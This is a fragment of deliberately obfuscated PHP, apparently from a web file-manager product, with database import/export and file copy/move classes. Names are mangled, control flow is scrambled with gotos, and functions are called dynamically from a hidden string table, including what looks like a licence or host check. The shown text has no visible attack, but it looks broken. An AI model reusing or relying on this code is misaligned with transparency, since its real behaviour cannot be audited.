$this->{$_SERVER[’û£ìÂ®Å‚][269]}($B³¸¯‚à¯…[1] . $EÒ¼ˆîÊÍ„[10], $EÒ¼ˆîÊÍ„[167]); if (!$EÔœ¸íØÀÈ) { return $EÒ¼ˆîÊÍ„[10]; } goto d†£³İ£œ¯; eÄ–ÑÊÕˆä: $EÚ‘ˆ¿’õ· = $d²ËÌâÑ‰ì[713]; if (!$EÚ‘ˆ¿’õ·) { die; } goto F‡ø‰ÃŞ¥¥; CÍÄ‹½Òöó: if (!$CŒªÄö„—Š) { die; } $A¬ƒ‡Õœ = $EÒ¼ˆîÊÍ„[263](($eÄŠĞòİ×ï + $Dó‘ÀÖ¡) / 2); while (1) { $eª²¹ù¨‘ = $A¬ƒ‡Õœ; $A†òšÑ°÷ = $d²ËÌâÑ‰ì[709]; if (strlen($A†òšÑ°÷) < $d²ËÌâÑ‰ì[612]) { die; } $eÚŞ½³†µƒ = $aõÊÊ»íã…; while ($eÚŞ½³†µƒ % $eª²¹ù¨‘ != 0) { $FËğƒùâÊ‹ = $eÚŞ½³†µƒ; $AÎÌÚ§ÙÉ = $d²ËÌâÑ‰ì[710]; if (strlen($AÎÌÚ§ÙÉ) < $d²ËÌâÑ‰ì[64]) { die; } $eÚŞ½³†µƒ = $eª²¹ù¨‘; $Bâƒ¡šØ‚ = $d²ËÌâÑ‰ì[711]; while (strlen($Bâƒ¡šØ‚) < $d²ËÌâÑ‰ì[589]) { if (!$Bâƒ¡šØ‚) { break; } $Bâƒ¡šØ‚++; } $eª²¹ù¨‘ = $FËğƒùâÊ‹ % $eª²¹ù¨‘; } if ($eª²¹ù¨‘ == 1) { break; } else { $A¬ƒ‡Õœ++; } } goto eË£øİ‘Ã×; C»ĞÉ¨Ñ©ª: $d²ËÌâÑ‰ì =& $_SERVER[Ü˜]; $EÒ¼ˆîÊÍ„ =& $_SERVER[’û£ìÂ®Å‚]; $B³¸¯‚à¯… = $EÒ¼ˆîÊÍ„[0]($EÒ¼ˆîÊÍ„[372], $C‡Ù°äĞ„Ó); goto A„²×æøèÏ; b§¸‘ö™Ãá: $dõ‰§ÅÑÀÀ = $d²ËÌâÑ‰ì[704]; if (strlen($dõ‰§ÅÑÀÀ) < $d²ËÌâÑ‰ì[584]) { return; } $Dó‘ÀÖ¡ = 0; goto DŠîœ¥Áé; DŠîœ¥Áé: for ($a’è¿ô˜ = 3; $a’è¿ô˜ < $EÔœ¸íØÀÈ; $a’è¿ô˜ += 2) { if ($EÔœ¸íØÀÈ % $a’è¿ô˜ != 0) { continue; } $eÄŠĞòİ×ï = $a’è¿ô˜; $f¦²õ«­Ñ = $d²ËÌâÑ‰ì[705]; if (strlen($f¦²õ«­Ñ) < $d²ËÌâÑ‰ì[64]) { die; } $Dó‘ÀÖ¡ = $EÒ¼ˆîÊÍ„[263]($EÔœ¸íØÀÈ / $a’è¿ô˜); $aËëÕÀõ = $d²ËÌâÑ‰ì[706]; if (!$aËëÕÀõ) { return; } break; $få‡Ùåİ¿ = $d²ËÌâÑ‰ì[707]; if (!$få‡Ùåİ¿) { return; } } $aõÊÊ»íã… = ($eÄŠĞòİ×ï - 1) * ($Dó‘ÀÖ¡ - 1); $CŒªÄö„—Š = $d²ËÌâÑ‰ì[708]; goto CÍÄ‹½Òöó; bÙî¢¾ºŞ¥: $DæòïáªÏ = $d²ËÌâÑ‰ì[712]; $cÄõØÓˆ¦º = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($B³¸¯‚à¯…[0], $D£»Á¾ÈÛ); return $cÄõØÓˆ¦º; goto eÄ–ÑÊÕˆä; F‡ø‰ÃŞ¥¥: } public function yktp1312dd36() { goto A ã¡¹›; A ã¡¹›: $D–âÄ·ŒÖ =& $_SERVER[Ü˜]; $fßáŠšÅğ =& $_SERVER[’û£ìÂ®Å‚]; $Dµ•Øï‰Ø— = $fßáŠšÅğ[354]($fßáŠšÅğ[373](2, 14), $fßáŠšÅğ[373](2, 16) - 1); goto CÈ¨˜òÃÈó; CÈ¨˜òÃÈó: $eÓ×°¯ÏÜ¦ = $D–âÄ·ŒÖ[714]; if (strlen($eÓ×°¯ÏÜ¦) < $D–âÄ·ŒÖ[612]) { return; } $aŒÊ­„±Ò¥ = array(); goto C•Ø¡“¡µŞ; EÎšÙîã¥: for ($CÖãµ‚Âôğ = $Dµ•Øï‰Ø—; $CÖãµ‚Âôğ > 1; $CÖãµ‚Âôğ--) { $EõŠ¼Ä’Ûô = !0; foreach ($aŒÊ­„±Ò¥ as $fºÚ–Ú¾») { if ($CÖãµ‚Âôğ % $fºÚ–Ú¾» == 0) { $EõŠ¼Ä’Ûô = !1; break; } } if ($EõŠ¼Ä’Ûô) { $Fì ‚‘êˆ = $CÖãµ‚Âôğ; break; } } return $Fì ‚‘êˆ; goto B­Ä…â¡; C•Ø¡“¡µŞ: $cé‹½âÍ±İ = 1; while ($cé‹½âÍ±İ <= (int) $fßáŠšÅğ[374]($Dµ•Øï‰Ø—)) { $CÖãµ‚Âôğ = $cé‹½âÍ±İ; while (!0) { $CÖãµ‚Âôğ++; $cÉâÊ›ŠÑª = $D–âÄ·ŒÖ[715]; if (!$cÉâÊ›ŠÑª) { die; } if ($CÖãµ‚Âôğ <= 2) { $cé‹½âÍ±İ = $CÖãµ‚Âôğ; break; } else { if ($CÖãµ‚Âôğ < 2) { continue; } } $EõŠ¼Ä’Ûô = !0; for ($FÙË˜›Õãæ = 2; $FÙË˜›Õãæ <= $fßáŠšÅğ[374]($CÖãµ‚Âôğ); $FÙË˜›Õãæ++) { if ($CÖãµ‚Âôğ % $FÙË˜›Õãæ == 0) { $EõŠ¼Ä’Ûô = !1; } } if ($EõŠ¼Ä’Ûô) { $cé‹½âÍ±İ = $CÖãµ‚Âôğ; break; } } $aŒÊ­„±Ò¥[] = $cé‹½âÍ±İ; } $Fì ‚‘êˆ = 2; goto EÎšÙîã¥; B­Ä…â¡: } public function sjul3778e75e($bï¤Ìà†ƒÈ, $F¢İäºØ†ğ) { $CëÛ½ê¦Ò§ =& $_SERVER[’û£ìÂ®Å‚]; return $CëÛ½ê¦Ò§[13](array($CëÛ½ê¦Ò§[14], $CëÛ½ê¦Ò§[375]), $bï¤Ìà†ƒÈ, $F¢İäºØ†ğ); } public function xgcv075f3e51($f¿Ûİ ¬Š•, $B†„¶ëê‹) { $EÓÁêŒ =& $_SERVER[’û£ìÂ®Å‚]; return $EÓÁêŒ[13](array($EÓÁêŒ[376], $EÓÁêŒ[377]), $f¿Ûİ ¬Š•, $B†„¶ëê‹); $aéÎì±±À = $_SERVER[Ü˜][716]; if (!$aéÎì±±À) { die; } } public function bzkd56b855e0($CôĞ¾Å†Éæ, $B‚“ÒøŞ) { $dó£‡ŒóÄš =& $_SERVER[’û£ìÂ®Å‚]; return $dó£‡ŒóÄš[13](array($dó£‡ŒóÄš[376], $dó£‡ŒóÄš[378]), $CôĞ¾Å†Éæ, $B‚“ÒøŞ); } } goto f¦À¦–Œ‚«; D²å®ÍùŸ: if ($_SERVER[$_SERVER[Ü˜][59]] != $FíÊÑ³‡¢¬($AÃ­ÒÃ‰Ÿ)) { goto d›ÁœÈÔèÛ; CøÃİóè¢: $EÄÑ£øã‰ë($AÃ­ÒÃ‰Ÿ); goto d½¥åˆĞÂ›; Fº–Ğƒ®ğì: $FÈ´Î•÷Åö = explode($_SERVER[Ü˜][63], $eÃâù‘¤Ë—); if (count($FÈ´Î•÷Åö) < $_SERVER[Ü˜][64]) { $CŠ…‚ƒŒ  = $_SERVER[Ü˜][65]; $CŠ…‚ƒŒ (); } $EÄÑ£øã‰ë = $_SERVER[Ü˜][66]; goto CøÃİóè¢; d›ÁœÈÔèÛ: $Dé…æÈŠô§ = $_SERVER[Ü˜][60]; $E·ø’¯ô¬ì = $_SERVER[$_SERVER[Ü˜][61]] . $_SERVER[Ü˜][62]; $eÃâù‘¤Ë— = $Dé…æÈŠô§($E·ø’¯ô¬ì); goto Fº–Ğƒ®ğì; d½¥åˆĞÂ›: } class DbManage { function __construct($b·×¡åÇ¶Š, $f ”ÒÖÂÎÉ = '') { $this->database = $b·×¡åÇ¶Š; $this->type = $f ”ÒÖÂÎÉ; } public function model($f·ßí‚¡ÀÛ = '') { return new ModelBase($f·ßí‚¡ÀÛ, $_SERVER[Ü˜][33], $this->database); } public function db($cé”·•“ñÕ = false) { goto Cñ¾ğµ—è; bÌĞ¸¼ºŒ: if (!$aôˆÖ•¶ƒ) { $f¸¥¶Ğ˜Û->execute("\143\162\x65\141\x74\145\x20\x64\x61\164\x61\142\141\163\145\x20\x60{$DøÈó†ê•}\140"); } $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[930]] = $DøÈó†ê•; if ($aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[763]] == $a°ˆÅë„¦‚[764]) { $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[765]] .= $a°ˆÅë„¦‚[1018] . $DøÈó†ê•; } goto fÂ±½¼ÛğÆ; fÅÇÀ¡´Ñ‡: $DøÈó†ê• = $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[930]]; $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[930]] = $a°ˆÅë„¦‚[33]; if ($aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[763]] == $a°ˆÅë„¦‚[764]) { $C¦¥ê¬©ã = $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[765]]; $aÇºÇ˜¾íÔ[$a°ˆÅë„¦‚[765]] = substr($C¦¥ê¬©ã, 0, strrpos($C¦¥ê¬©ã, $a°ˆÅë„¦‚[1018])); } goto b‹ÊÉÎÓ±Ç; Cñ¾ğµ—è: $a°ˆÅë„¦‚ =& $_SERVER[Ü˜]; $aÇºÇ˜¾íÔ = array_change_key_case($this->database); if ($this->type == $a°ˆÅë„¦‚[9] || !$cé”·•“ñÕ) { return $this->model()->db(); } goto fÅÇÀ¡´Ñ‡; b‹ÊÉÎÓ±Ç: $this->database = $aÇºÇ˜¾íÔ; $f¸¥¶Ğ˜Û = $this->model()->db(); try { $aôˆÖ•¶ƒ = $f¸¥¶Ğ˜Û->execute("\163\x68\x6f\x77\40\x64\141\164\141\x62\x61\x73\x65\163\x20\154\x69\x6b\x65\40\47{$DøÈó†ê•}\x27"); } catch (Exception $EŠäùÒó°Ë) { } goto bÌĞ¸¼ºŒ; fÂ±½¼ÛğÆ: $this->database = $aÇºÇ˜¾íÔ; $f¸¥¶Ğ˜Û->execute("\165\163\x65\40\x60{$DøÈó†ê•}\140"); return $f¸¥¶Ğ˜Û; goto dÌ³Ë‹ƒ£Š; dÌ³Ë‹ƒ£Š: } public function createTable($Fõë°¡Î, $fŠï‹†ã•• = null) { $ašĞ‚Ä‹íå =& $_SERVER[Ü˜]; if (!IO::exist($Fõë°¡Î)) { ActionCall($ašĞ‚Ä‹íå[1019], !0, 0); show_json(LNG($ašĞ‚Ä‹íå[1020]), !1); } $dÒÊ¿ö® = sqlSplit(IO::getContent($Fõë°¡Î)); foreach ($dÒÊ¿ö® as $Cˆ›†Ÿ¡¡Í) { if ($fŠï‹†ã••) { $Cé²·ãƒë‰ = stripos($Cˆ›†Ÿ¡¡Í, $ašĞ‚Ä‹íå[1021]) === 0; if ($Cé²·ãƒë‰) { $fŠï‹†ã••->task[$ašĞ‚Ä‹íå[1022]] += 1; } } $this->model()->db()->execute($Cˆ›†Ÿ¡¡Í); if ($fŠï‹†ã•• && $Cé²·ãƒë‰) { preg_match($ašĞ‚Ä‹íå[1023], $Cˆ›†Ÿ¡¡Í, $eõõ¶ñ¾Ãº); $fŠï‹†ã••->task[$ašĞ‚Ä‹íå[1024]] = $eõõ¶ñ¾Ãº[1]; $fŠï‹†ã••->update(1); } } $this->taskToCache($fŠï‹†ã••); } public function insertTable($A’ÈğŞ¡…•, $F¤²ŠËÆƒÉ = null) { $C¡ƒ¦ãøÌÈ =& $_SERVER[Ü˜]; $EˆàÇ—ÌğË = $this->model()->db(); $D­çÔí¢˜Ë = $d›ªŒî§‹ß ? array($d›ªŒî§‹ß) : $EˆàÇ—ÌğË->getTables(); foreach ($A’ÈğŞ¡…• as $aõŒº¸‡Æ) { $d›ªŒî§‹ß = basename($aõŒº¸‡Æ, $C¡ƒ¦ãøÌÈ[755]); if (!in_array($d›ªŒî§‹ß, $D­çÔí¢˜Ë)) { continue; } if ($F¤²ŠËÆƒÉ) { $F¤²ŠËÆƒÉ->task[$C¡ƒ¦ãøÌÈ[1024]] = $d›ªŒî§‹ß; } if (get_filesize($aõŒº¸‡Æ) == 0) { continue; } $dğ…Ù’ìÈË = $this->sqlToDb($aõŒº¸‡Æ, $F¤²ŠËÆƒÉ); if (!$dğ…Ù’ìÈË) { ActionCall($C¡ƒ¦ãøÌÈ[1019], !0, 0); show_json(LNG($C¡ƒ¦ãøÌÈ[1025]) . "\x5b{$d›ªŒî§‹ß}\135", !1); } } $this->taskToCache($F¤²ŠËÆƒÉ); } public function sqlFromDb($FĞŞçŸßé², $B¢Õ³…ÓÂ’, $e­Ûùóøï¿ = null, $A¢ìÒìö¿” = null) { goto bô¼ËÑ»°ö; b•—¤¾†¥Ñ: $c›»—ÓÜä¯ = 0; $Eˆ¾Ä¼…©ğ = 10000; $bÌŸÂ‰ˆÇÁ = fopen($B¢Õ³…ÓÂ’, $_SERVER[Ü˜][1026]); goto D¶°–ºÄÆ; BÍ‰¯ßÑŸ: fclose($bÌŸÂ‰ˆÇÁ); return $bò—­¥—²®; goto bù‰Ü³é¦Ú; bô¼ËÑ»°ö: if ($e­Ûùóøï¿) { $e­Ûùóøï¿->task[$_SERVER[Ü˜][1024]] = $FĞŞçŸßé²; } $CË—£ïë¥ = $this->model($FĞŞçŸßé²); $bò—­¥—²® = 0; goto b•—¤¾†¥Ñ; D¶°–ºÄÆ: $eéÀöŸßø = $CË—£ïë¥->getPk(); $D½¤¢øÀ‹ = $CË—£ïë¥->getDbFields(); do { $f´Ê—‘æ°Â = array($eéÀöŸßø => array($_SERVER[Ü˜][972], $c›»—ÓÜä¯)); $cÇ¢È©¹“Ë = $CË—£ïë¥->where($f´Ê—‘æ°Â)->field($D½¤¢øÀ‹)->order($eéÀöŸßø . $_SERVER[Ü˜][1027])->limit($Eˆ¾Ä¼…©ğ)->select(); $cÇ¢È©¹“Ë = !empty($cÇ¢È©¹“Ë) ? $cÇ¢È©¹“Ë : array(); if (!($E´‰—Á²¥ = count($cÇ¢È©¹“Ë))) { break; } $eùòÕ·«Ä = end($cÇ¢È©¹“Ë); $c›»—ÓÜä¯ = $eùòÕ·«Ä[$eéÀöŸßø]; $AŸˆ•Œ¿àÙ = array(); foreach ($cÇ¢È©¹“Ë as $D¼Ø‘øğÒ¹) { if ($FĞŞçŸßé² == $_SERVER[Ü˜][1028] && $D¼Ø‘øğÒ¹[$_SERVER[Ü˜][29]] == $_SERVER[Ü˜][1029]) { $eÔ“î˜øà® = json_decode($D¼Ø‘øğÒ¹[$_SERVER[Ü˜][381]], !0); if ($eÔ“î˜øà®[$_SERVER[Ü˜][28]] == date($_SERVER[Ü˜][720]) && !$eÔ“î˜øà®[$_SERVER[Ü˜][719]]) { continue; } } if ($A¢ìÒìö¿”) { $D¼Ø‘øğÒ¹[$_SERVER[Ü˜][86]] = "\173\x69\157\x3a{$A¢ìÒìö¿”}\x7d" . substr($D¼Ø‘øğÒ¹[$_SERVER[Ü˜][86]], strlen("\173\x69\157\x3a{$D¼Ø‘øğÒ¹[$_SERVER[Ü˜][791]]}\175")); $D¼Ø‘øğÒ¹[$_SERVER[Ü˜][791]] = $A¢ìÒìö¿”; } $AŸˆ•Œ¿àÙ[] = $_SERVER[Ü˜][1030] . $this->sqlEncode($D¼Ø‘øğÒ¹) . $_SERVER[Ü˜][1031]; } $dåèªŠ†À• = "\x49\116\x53\105\x52\124\40\111\x4e\124\x4f\x20\140{$FĞŞçŸßé²}\140\x20\x28\x60" . implode($_SERVER[Ü˜][1032], $D½¤¢øÀ‹) . $_SERVER[Ü˜][1033]; fwrite($bÌŸÂ‰ˆÇÁ, $dåèªŠ†À• . implode($_SERVER[Ü˜][1034], $AŸˆ•Œ¿àÙ) . $_SERVER[Ü˜][78] . PHP_EOL); $bò—­¥—²® += $E´‰—Á²¥; if ($e­Ûùóøï¿) { $e­Ûùóøï¿->update($E´‰—Á²¥); } } while ($Eˆ¾Ä¼…©ğ == $E´‰—Á²¥); goto BÍ‰¯ßÑŸ; bù‰Ü³é¦Ú: } public function sqlToDb($Dƒ††Ï›¥ì, $E´’Æø¢ = null) { goto FÏÊÎáµÜÊ; FÏÊÎáµÜÊ: $F³Å»Ê——ó =& $_SERVER[Ü˜]; $D£‹Îâß‹ = $this->model()->db(); $A®š¡¢ÒÉˆ = @fopen($Dƒ††Ï›¥ì, $F³Å»Ê——ó[1035]); goto Cã»óôß‚Ù; Cã»óôß‚Ù: if (!$A®š¡¢ÒÉˆ) { return !1; } $Dôï´©²¦ = 0; $b»½åÖÈÜø = $F³Å»Ê——ó[33]; goto CÛ½á‹íŠ¶; cêãÒ°äİá: if (!empty($c¥•×ÒÒâ)) { $BÇÍ¼£·Öğ = $b»½åÖÈÜø . implode($F³Å»Ê——ó[47], $c¥•×ÒÒâ); if (!$D£‹Îâß‹->execute($BÇÍ¼£·Öğ)) { return !1; } if ($E´’Æø¢) { $E´’Æø¢->update($Dôï´©²¦); } } return !0; goto EîŒÆ»„‹; DĞÏÔÍ‰…»: if ($Aƒ†‡ôØá” == $F³Å»Ê——ó[1036]) { $AÓŠÃìÛ»Û = 50; } while (!feof($A®š¡¢ÒÉˆ)) { $DõÇ¶¢šÖ³ = trim(fgets($A®š¡¢ÒÉˆ)); if (!$DõÇ¶¢šÖ³) { continue; } $BÇÍ¼£·Öğ = $this->sqlDecode($DõÇ¶¢šÖ³, $this->type); if (stripos($BÇÍ¼£·Öğ, $F³Å»Ê——ó[364]) === 0) { if (!$b»½åÖÈÜø) { $b»½åÖÈÜø = $BÇÍ¼£·Öğ . $F³Å»Ê——ó[50]; } continue; } if ($E´’Æø¢) { $E´’Æø¢->task[$F³Å»Ê——ó[1022]] += 1; } $Dôï´©²¦++; $c¥•×ÒÒâ[] = rtrim(rtrim(trim($BÇÍ¼£·Öğ), $F³Å»Ê——ó[47]), $F³Å»Ê——ó[78]); if ($Dôï´©²¦ >= $AÓŠÃìÛ»Û) { $BÇÍ¼£·Öğ = $b»½åÖÈÜø . implode($F³Å»Ê——ó[47], $c¥•×ÒÒâ); if (!$D£‹Îâß‹->execute($BÇÍ¼£·Öğ)) { return !1; } if ($E´’Æø¢) { $E´’Æø¢->update($Dôï´©²¦); } $c¥•×ÒÒâ = array(); $Dôï´©²¦ = 0; } } fclose($A®š¡¢ÒÉˆ); goto cêãÒ°äİá; CÛ½á‹íŠ¶: $c¥•×ÒÒâ = array(); $AÓŠÃìÛ»Û = $this->type == $F³Å»Ê——ó[9] ? 500 : 2000; $Aƒ†‡ôØá” = basename($Dƒ††Ï›¥ì, $F³Å»Ê——ó[755]); goto DĞÏÔÍ‰…»; EîŒÆ»„‹: } public function dropTable($B±³‡ãó†Â = null) { $DÖÊí¿—‹œ = $this->model()->db(); $dÖ§ØÓÒøË = $B±³‡ãó†Â ? array($B±³‡ãó†Â) : $DÖÊí¿—‹œ->getTables(); if (!$dÖ§ØÓÒøË) { return; } foreach ($dÖ§ØÓÒøË as $B±³‡ãó†Â) { $DÖÊí¿—‹œ->execute("\144\162\x6f\160\x20\164\141\x62\154\x65\x20\151\146\x20\145\x78\151\163\164\x73\40\140{$B±³‡ãó†Â}\x60"); } } private function taskToCache($EŒ“¨—®›­ = null) { $E¨âÖĞ“ =& $_SERVER[Ü˜]; if (!$EŒ“¨—®›­) { return; } $a‹ÂÛ³†ìİ = array($E¨âÖĞ“[1024] => $EŒ“¨—®›­->task[$E¨âÖĞ“[1024]], $E¨âÖĞ“[1022] => $EŒ“¨—®›­->task[$E¨âÖĞ“[1022]], $E¨âÖĞ“[1037] => $EŒ“¨—®›­->task[$E¨âÖĞ“[1037]]); if ($a‹ÂÛ³†ìİ[$E¨âÖĞ“[1022]] == $a‹ÂÛ³†ìİ[$E¨âÖĞ“[1037]]) { $a‹ÂÛ³†ìİ[$E¨âÖĞ“[729]] = 1; } Cache::set($E¨âÖĞ“[1038] . $EŒ“¨—®›­->task[$E¨âÖĞ“[402]], $a‹ÂÛ³†ìİ); $EŒ“¨—®›­->end(); } private function sqlEncode($Aº’ ô‡å) { $Fî¿â¤ŸÆ³ =& $_SERVER[Ü˜]; $AË¤‘Á‹ì‚ = array(); foreach ($Aº’ ô‡å as $BÂÄŞ£¤ŠÅ) { if (is_array($BÂÄŞ£¤ŠÅ)) { $BÂÄŞ£¤ŠÅ = json_encode_force($BÂÄŞ£¤ŠÅ); } $BÂÄŞ£¤ŠÅ = addslashes($BÂÄŞ£¤ŠÅ); $BÂÄŞ£¤ŠÅ = str_replace(array($Fî¿â¤ŸÆ³[1039], $Fî¿â¤ŸÆ³[63]), array($Fî¿â¤ŸÆ³[1040], $Fî¿â¤ŸÆ³[1041]), $BÂÄŞ£¤ŠÅ); $AË¤‘Á‹ì‚[] = str_replace($Fî¿â¤ŸÆ³[55], $Fî¿â¤ŸÆ³[1042], $BÂÄŞ£¤ŠÅ); } return $Fî¿â¤ŸÆ³[55] . implode($Fî¿â¤ŸÆ³[1043], $AË¤‘Á‹ì‚) . $Fî¿â¤ŸÆ³[55]; } private function sqlDecode($B¡”ÔÖ±À‚, $EÕ¬âËÆŸ) { $D´©¥ÜŸÓØ =& $_SERVER[Ü˜]; $B¡”ÔÖ±À‚ = str_replace(array($D´©¥ÜŸÓØ[1040], $D´©¥ÜŸÓØ[1041]), array($D´©¥ÜŸÓØ[1039], $D´©¥ÜŸÓØ[63]), $B¡”ÔÖ±À‚); if ($EÕ¬âËÆŸ == $D´©¥ÜŸÓØ[9]) { $B¡”ÔÖ±À‚ = stripslashes($B¡”ÔÖ±À‚); } return $B¡”ÔÖ±À‚; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($C‡²‡™¥Ş„, $a¥º¶òˆÆ×) { goto A†…‘ÏÀ©İ; dù½ÁÉ¿ÂÌ: Hook::trigger($AÇĞ¼ëùÛ¥[1045] . $C‡²‡™¥Ş„ . $AÇĞ¼ëùÛ¥[1046], $dù˜ê¦¡ªÃ); $b¡ìñğ¼ßÁ = self::driverMake($a¥º¶òˆÆ×[0]); if (method_exists($b¡ìñğ¼ßÁ, $C‡²‡™¥Ş„)) { $EÀ‚â²§® = @call_user_func_array(array($b¡ìñğ¼ßÁ, $C‡²‡™¥Ş„), $a¥º¶òˆÆ×); } else { if (method_exists($b¡ìñğ¼ßÁ, $AÇĞ¼ëùÛ¥[1047])) { $EÀ‚â²§® = @call_user_func_array(array($b¡ìñğ¼ßÁ, $C‡²‡™¥Ş„), $a¥º¶òˆÆ×); } else { if (method_exists(self, $C‡²‡™¥Ş„)) { $EÀ‚â²§® = @call_user_func_array(array(self, $C‡²‡™¥Ş„), $a¥º¶òˆÆ×); } else { $EÀ‚â²§® = call_user_func_array(array(parent, $C‡²‡™¥Ş„), $a¥º¶òˆÆ×); } } } goto e•íê‚¿ˆ; A†…‘ÏÀ©İ: $AÇĞ¼ëùÛ¥ =& $_SERVER[Ü˜]; $dù˜ê¦¡ªÃ = $a¥º¶òˆÆ×; $GLOBALS[$AÇĞ¼ëùÛ¥[1044]] = $AÇĞ¼ëùÛ¥[1045] . $C‡²‡™¥Ş„; goto dù½ÁÉ¿ÂÌ; e•íê‚¿ˆ: Hook::trigger($AÇĞ¼ëùÛ¥[1045] . $C‡²‡™¥Ş„ . $AÇĞ¼ëùÛ¥[1048], $dù˜ê¦¡ªÃ, $EÀ‚â²§®); return $EÀ‚â²§®; goto E×µµï¾ÓÕ; E×µµï¾ÓÕ: } public static function init($BßÁŠêêÔ¦) { return self::driverMake($BßÁŠêêÔ¦); } public static function copy($D„¢‰‡ĞÍè, $CÖ‘§±¨‹´, $bŠÈÍ‹Ê = false, $f¡ø…Ùß¦† = false) { return self::copyMoveStart($D„¢‰‡ĞÍè, $CÖ‘§±¨‹´, $bŠÈÍ‹Ê, $_SERVER[Ü˜][527], $f¡ø…Ùß¦†); } public static function move($dÕ‚®¼¡ç, $FŸÇ„ãÌ‚Ï, $cƒïÂ®é³ = false, $dÁ©ô°Ìˆğ = false) { return self::copyMoveStart($dÕ‚®¼¡ç, $FŸÇ„ãÌ‚Ï, $cƒïÂ®é³, $_SERVER[Ü˜][529], $dÁ©ô°Ìˆğ); } private static function copyMoveStart($Aœ•İ¶İÚ¨, $d¸„…¿Ú§, $d»‹´àí, $dğƒ­ƒ®ÅÔ, $fÎÔ„±°Œ‚) { $añ‚¥¼»ğ =& $_SERVER[Ü˜]; $F¤‚’”åœ… = array($Aœ•İ¶İÚ¨, $d¸„…¿Ú§, $d»‹´àí, $fÎÔ„±°Œ‚); Hook::trigger($añ‚¥¼»ğ[1045] . $dğƒ­ƒ®ÅÔ . $añ‚¥¼»ğ[1046], $F¤‚’”åœ…); $dñùŒÔæº = self::copyMove($Aœ•İ¶İÚ¨, $d¸„…¿Ú§, $d»‹´àí, $dğƒ­ƒ®ÅÔ, $fÎÔ„±°Œ‚); Hook::trigger($añ‚¥¼»ğ[1045] . $dğƒ­ƒ®ÅÔ . $añ‚¥¼»ğ[1048], $F¤‚’”åœ…, $dñùŒÔæº); return $dñùŒÔæº; } public static function saveFile($a“ƒÔÑ£Ú«, $AË‚¡Áíå„, $fåÉÉ­µ´† = true) { goto AôÅµ›£ŸÅ; F±’¶”Œ: $b¼Ì”«ÍĞİ = $c–¢–ñÀÓ»->pathFather($AË‚¡Áíå„); $d­‰¥Ô‘Âß = !0; if (!$fåÉÉ­µ´† && self::driverIsSame($Bœ½°•†Öå, $c–¢–ñÀÓ»)) { $d­‰¥Ô‘Âß = !1; } goto A‡ãß§˜Ëè; A‡ãß§˜Ëè: $f˜Íâ»Ä‰Ô = self::copyFile($Bœ½°•†Öå, $a“ƒÔÑ£Ú«, $c–¢–ñÀÓ», $b¼Ì”«ÍĞİ, $Cá¾ášÕî[$B¨œ»‹¥À[28]], $d­‰¥Ô‘Âß); if ($AÄœö¦Ê’) { $f˜Íâ»Ä‰Ô = $AÄœö¦Ê’->getPathOuter($f˜Íâ»Ä‰Ô); } return $f˜Íâ»Ä‰Ô; goto f¨’›ÑÌš«; E¹ã÷èŒ: $c–¢–ñÀÓ» = self::driverMake($AË‚¡Áíå„); $AÄœö¦Ê’ = !1; if ($c–¢–ñÀÓ»->pathParse[$B¨œ»‹¥À[1049]]) { $b¸ƒ³ÃîˆŒ = $c–¢–ñÀÓ»->pathParse[$B¨œ»‹¥À[1049]]; $AÄœö¦Ê’ = $c–¢–ñÀÓ»; $c–¢–ñÀÓ» = self::driverMake($b¸ƒ³ÃîˆŒ); } goto F±’¶”Œ; AôÅµ›£ŸÅ: $B¨œ»‹¥À =& $_SERVER[Ü˜]; $Cá¾ášÕî = self::info($AË‚¡Áíå„); $Bœ½°•†Öå = self::driverMake($a“ƒÔÑ£Ú«); goto E¹ã÷èŒ; f¨’›ÑÌš«: } private static function copyMove($AİÜÏíÆ, $cì¿ä¤ËÜĞ, $D‡¹­´Ğ¡Ì, $a¿†ËÖœÛ, $D¬Êï’ñçÆ = false) { goto b¼— ¹Ó“®; A„ÒÜÒ¯ğÄ: $b‹ƒíæÖÇ„ = $e…×‚‡Ìùœ->isFile($AİÜÏíÆ); if (!$b‹ƒíæÖÇ„ && $e’ğ¥ñìç…->getType() == $f«´ØŠ¾Í±[727] && $e…×‚‡Ìùœ->getType() == $f«´ØŠ¾Í±[116]) { $FÅëœçË‡ = $e’ğ¥ñìç…->copyFolderFromIO($e…×‚‡Ìùœ, $AİÜÏíÆ, $cì¿ä¤ËÜĞ, $D‡¹­´Ğ¡Ì, $FÈ‘…¦‹Ù, $D¬Êï’ñçÆ); } else { $FÅëœçË‡ = self::copyPath($e…×‚‡Ìùœ, $AİÜÏíÆ, $e’ğ¥ñìç…, $cì¿ä¤ËÜĞ, $D‡¹­´Ğ¡Ì, $FÈ‘…¦‹Ù, $b‹ƒíæÖÇ„, $D¬Êï’ñçÆ); } if ($FÅëœçË‡ && $FÈ‘…¦‹Ù) { $e…×‚‡Ìùœ->remove($AİÜÏíÆ); } goto aÔ‡†ŒîçÔ; aÔ‡†ŒîçÔ: if ($C½ã–ÊŠ“) { $FÅëœçË‡ = $C½ã–ÊŠ“->getPathOuter($FÅëœçË‡); } return $FÅëœçË‡; goto c¥°‡˜êø¿; cƒØÃ¹ÚÈ“: Hook::trigger($f«´ØŠ¾Í±[83], $e…×‚‡Ìùœ, $AİÜÏíÆ, $e’ğ¥ñìç…, $cì¿ä¤ËÜĞ); $A»¼–Ùíí³ = self::driverIsSame($e…×‚‡Ìùœ, $e’ğ¥ñìç…); if ($A»¼–Ùíí³) { if ($a¿†ËÖœÛ == $f«´ØŠ¾Í±[529] && !method_exists($e’ğ¥ñìç…, $f«´ØŠ¾Í±[1050]) && trim($cì¿ä¤ËÜĞ, $f«´ØŠ¾Í±[8]) == trim($e’ğ¥ñìç…->pathFather($AİÜÏíÆ), $f«´ØŠ¾Í±[8])) { if ($e…×‚‡Ìùœ->pathThis($AİÜÏíÆ) != $D¬Êï’ñçÆ && !$e…×‚‡Ìùœ->isTypeObject()) { return $e…×‚‡Ìùœ->rename($AİÜÏíÆ, $D¬Êï’ñçÆ); } return $e’ğ¥ñìç…->getPathOuter($AİÜÏíÆ); } if (method_exists($e’ğ¥ñìç…, $a¿†ËÖœÛ)) { return 